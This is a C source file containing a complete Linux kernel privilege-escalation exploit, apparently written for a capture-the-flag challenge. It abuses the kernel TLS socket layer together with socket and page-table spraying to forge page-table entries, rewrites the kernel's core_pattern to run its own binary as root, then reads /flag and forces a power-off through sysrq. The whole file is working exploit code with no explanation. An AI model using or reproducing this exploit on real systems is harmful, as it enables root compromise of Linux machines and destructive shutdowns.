#define _GNU_SOURCE
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#define ULP "tls"
#define TLS_1_2_VERSION_MAJOR 0x3
#define TLS_1_2_VERSION_MINOR 0x3

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

pthread_barrier_t barrier;
struct sockaddr_in server_addr;

void pin_on_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

void hexdump(const void *data, int size) {
    #define C_GREEN "\x1b[32m"
    #define C_RESET "\x1b[0m"

    const unsigned char *p = (const unsigned char *)data;
    unsigned int max_off = ((size - 1) / 16) * 16;
    int width = snprintf(NULL, 0, "%x", max_off);

    for (int off = 0; off < size; off += 16) {
        int n = (size - off > 16) ? 16 : (size - off);

        printf(C_GREEN "0x%0*x" C_RESET " | ", width, off);

        for (int i = 0; i < 16; ++i) {
            if (i < n) printf("%02x ", p[off + i]);
            else       printf("   ");
        }

        printf("| ");

        for (int i = 0; i < 16; ++i) {
            if (i < n) {
                unsigned char c = p[off + i];
                putchar((c >= 0x20 && c <= 0x7e) ? c : '.');
            } else {
                putchar(' ');
            }
        }

        printf(" |\n");
    }
}

void enable_tls(int fd)
{
    SYSCHK(setsockopt(fd, IPPROTO_TCP, TCP_ULP, ULP, sizeof(ULP)));

    struct tls12_crypto_info_aes_gcm_128 ci = {};
    ci.info.version = TLS_1_2_VERSION;
    ci.info.cipher_type = TLS_CIPHER_AES_GCM_128;

    SYSCHK(setsockopt(fd, SOL_TLS, TLS_TX, &ci, sizeof(ci)));
    SYSCHK(setsockopt(fd, SOL_TLS, TLS_RX, &ci, sizeof(ci)));
}

void *tls_server(void *dummy)
{
    char buf[0x100] = {};
    int server_fd;
    int accept_fd;

    {
        SYSCHK(server_fd = socket(AF_INET, SOCK_STREAM, 0));
        SYSCHK(setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)));
        SYSCHK(bind(server_fd, (const struct sockaddr *)&server_addr, sizeof(server_addr)));
        SYSCHK(listen(server_fd, 1));
        pthread_barrier_wait(&barrier);
    }

    {
        SYSCHK(accept_fd = accept(server_fd, NULL, 0));
        {
            int rcvbuf_size = 0x0; // min: 0x900
            setsockopt(accept_fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf_size, sizeof(rcvbuf_size));
        }
        
        enable_tls(accept_fd);
        pthread_barrier_wait(&barrier);
    }

    {
        pthread_barrier_wait(&barrier);
        {
            int rcvbuf_size = 0x20000;
            setsockopt(accept_fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf_size, sizeof(rcvbuf_size));
        }
        pthread_barrier_wait(&barrier);
    }

    return NULL;
}

#define PAGETABLE_BASE ((void *)0x80000000)
#define PT_SIZE (0x200000)
void *pagetable;
char buf[0x6000];

#define SPRAY_COUNT 2000
int tmp_client_fds[SPRAY_COUNT];
int tmp_accept_fds[SPRAY_COUNT];
void spray()
{
    struct sockaddr_in tmp_server = (struct sockaddr_in) {
        .sin_family = AF_INET,
        .sin_port = htons(1234),
        .sin_addr.s_addr = inet_addr("127.0.0.1"),
    };
    int tmp_server_fd;
    int pipefd[2];
    
    pipe(pipefd);

    SYSCHK(tmp_server_fd = socket(AF_INET, SOCK_STREAM, 0));
    SYSCHK(setsockopt(tmp_server_fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)));
    SYSCHK(bind(tmp_server_fd, (const struct sockaddr *)&tmp_server, sizeof(tmp_server)));
    SYSCHK(listen(tmp_server_fd, SPRAY_COUNT));

    for (int i = 0; i < SPRAY_COUNT; i++) {
        SYSCHK(tmp_client_fds[i] = socket(AF_INET, SOCK_STREAM, 0));
        SYSCHK(connect(tmp_client_fds[i], (const struct sockaddr *)&tmp_server, sizeof(tmp_server)));
        SYSCHK(tmp_accept_fds[i] = accept(tmp_server_fd, NULL, 0));

        write(pipefd[1], buf, 0x5008); // only copy the 511 
        SYSCHK(splice(pipefd[0], NULL, tmp_accept_fds[i], NULL, 0x5008, 0));
    }

    for (int i = 0; i < 2000; i++) {
        close(tmp_client_fds[i]);
        close(tmp_accept_fds[i]);
    }
    close(tmp_server_fd);
}

#define CORE_PATTERN_OFFSET (0x20e320UL)
int main(int argc, char *argv[])
{
    if (argc > 1) {
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        dup2(stdoutfd, 1);
        
        system("cat /flag;echo o>/proc/sysrq-trigger");
        execlp("bash", "bash", NULL);
    }

    {
        int memfd = memfd_create("", 0);
        sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
        dup2(memfd, 666);
        close(memfd);
    }

    
    void *ptr;
    unsigned long ktext_base = 0xffffffff81000000UL;

    printf("[+] initialize\n");
    {
        pin_on_cpu(0);
        spray();
        
        SYSCHK(ptr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_POPULATE, -1, 0));
        SYSCHK(pagetable = mmap(PAGETABLE_BASE, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_POPULATE, -1, 0));
        pthread_barrier_init(&barrier, NULL, 2);
    }

    server_addr = (struct sockaddr_in) {
        .sin_family = AF_INET,
        .sin_port = htons(6969),
        .sin_addr.s_addr = inet_addr("127.0.0.1"),
    };

    int client_fd;
    pthread_t tid;

    {
        pthread_create(&tid, NULL, tls_server, NULL);
        pthread_barrier_wait(&barrier);
    }

    {
        SYSCHK(client_fd = socket(AF_INET, SOCK_STREAM, 0));
        SYSCHK(connect(client_fd, (const struct sockaddr *)&server_addr, sizeof(server_addr)));
    }
    
    {
        pthread_barrier_wait(&barrier);
    }

    #define PAGETABLE_SPRAY_COUNT 2000
    printf("[+] spraying pagetable\n");
    {
        void *pt = pagetable;
        unsigned count = 0;
        unsigned long pt_size = PT_SIZE;

        for (int i = 0; i < PAGETABLE_SPRAY_COUNT; i++) {
            pt += pt_size;
            SYSCHK(mmap(pt, PT_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0));
            
            for (int j = 0; j < PT_SIZE / 0x1000; j++) {
                count += *(unsigned char *)(pt + j * 0x1000);
            }
        }
        printf("[+] count: %d (for populate pagetable)\n", count);
    }

    printf("[+] craft PTEs\n");
    {
        unsigned long *pte_iter = ptr;
        for (int i = 1; i < 512; i++) {
            unsigned long guess_base = (1UL << 24) * i;
            *(pte_iter + i) = guess_base | (CORE_PATTERN_OFFSET & ~0xfff) | 0x67;
        }
    }
    
    {
        send(client_fd, ptr, 1, 0);
        send(client_fd, ptr, 1, MSG_OOB); // inq = 0x1
        send(client_fd, ptr, 0x2000, 0); // enable copy_mode
        pthread_barrier_wait(&barrier);

        send(client_fd, ptr, 1, MSG_OOB);
        for (int i = 0; i < 5; i++) {
            send(client_fd, ptr, 1, 0);
        }

        pthread_barrier_wait(&barrier);
        pthread_join(tid, NULL);
    }

    {
        void *pt = pagetable;
        unsigned long pt_size = PT_SIZE;

        for (int i = 0; i < PAGETABLE_SPRAY_COUNT; i++) {
            pt += pt_size;

            for (int j = 0; j < PT_SIZE / 0x1000; j++) {
                void *guess_addr = pt + (j * 0x1000) + (CORE_PATTERN_OFFSET & 0xfff);

                if (!strcmp(guess_addr, "core")) {
                    strcpy(guess_addr, "|/proc/%P/fd/666 %P");
                    
                    char tmpbuf[0x20] = {};
                    
                    int core_pattern_fd;
                    SYSCHK(core_pattern_fd = open("/proc/sys/kernel/core_pattern", O_RDONLY));
                    read(core_pattern_fd, tmpbuf, sizeof(tmpbuf));
                    printf("[+] /proc/sys/kernel/core_pattern: %s\n", tmpbuf);
                    *(unsigned long *)0 = 0;
                }
            }
        }
    }

    return 0;
}
